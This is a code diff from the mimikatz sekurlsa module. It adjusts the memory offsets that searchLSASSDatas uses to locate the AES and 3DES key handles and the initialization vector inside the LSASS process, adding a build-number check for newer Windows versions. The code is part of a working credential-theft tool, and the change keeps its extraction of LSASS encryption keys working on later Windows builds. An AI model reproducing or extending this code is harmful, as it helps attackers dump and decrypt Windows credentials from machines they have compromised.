@@ -235,7 +235,6 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 						PTRN_WNT6_LsaInitializeProtectedMemory_KEY = PTRN_WNO8_LsaInitializeProtectedMemory_KEY;
 						SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY = sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY);
 						OFFS_WNT6_hAesKey = OFFS_WNO8_hAesKey;
-
 #ifdef _M_X64
 						if(mod_system::GLOB_Version.dwMinorVersion < 1)
 						{
@@ -251,7 +250,6 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 						OFFS_WNT6_h3DesKey = OFFS_WNO8_h3DesKey;
 						OFFS_WNT6_InitializationVector = OFFS_WNO8_InitializationVector;
 #endif
-
 					}
 					else
 					{
@@ -265,11 +263,12 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 					if(mod_memory::searchMemory(addrMonModule, addrMonModule + mesInfos.SizeOfImage, PTRN_WNT6_LsaInitializeProtectedMemory_KEY, &ptrBase, SIZE_PTRN_WNT6_LsaInitializeProtectedMemory_KEY))
 					{
 #ifdef _M_X64
+						LONG OFFS_WNT6_AdjustProvider = (mod_system::GLOB_Version.dwBuildNumber < 8000) ? 5 : 4;
 						PBYTE	InitializationVector	= reinterpret_cast<PBYTE  >((ptrBase + OFFS_WNT6_InitializationVector) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_InitializationVector));
 						hAesKey			= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_hAesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey));
 						h3DesKey		= reinterpret_cast<PKIWI_BCRYPT_KEY *>((ptrBase + OFFS_WNT6_h3DesKey) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey));
-						hAesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_hAesKey - 3 - 5 -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey - 3 - 5 -sizeof(long)));
-						h3DesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_h3DesKey - 3 - 5 -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey - 3 - 5 -sizeof(long)));
+						hAesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_hAesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
+						h3DesProvider	= reinterpret_cast<BCRYPT_ALG_HANDLE *>((ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)) + sizeof(long) + *reinterpret_cast<long *>(ptrBase + OFFS_WNT6_h3DesKey - 3 - OFFS_WNT6_AdjustProvider -sizeof(long)));
 #elif defined _M_IX86
 						PBYTE	InitializationVector	= *reinterpret_cast<PBYTE * >(ptrBase + OFFS_WNT6_InitializationVector);
 						hAesKey			= *reinterpret_cast<PKIWI_BCRYPT_KEY **>(ptrBase + OFFS_WNT6_hAesKey);
@@ -367,9 +366,6 @@ bool mod_mimikatz_sekurlsa::LsaCleanupProtectedMemory_NT6()
 
 	return true;
 }
-
-
-
 
 PLIST_ENTRY mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind)
 {
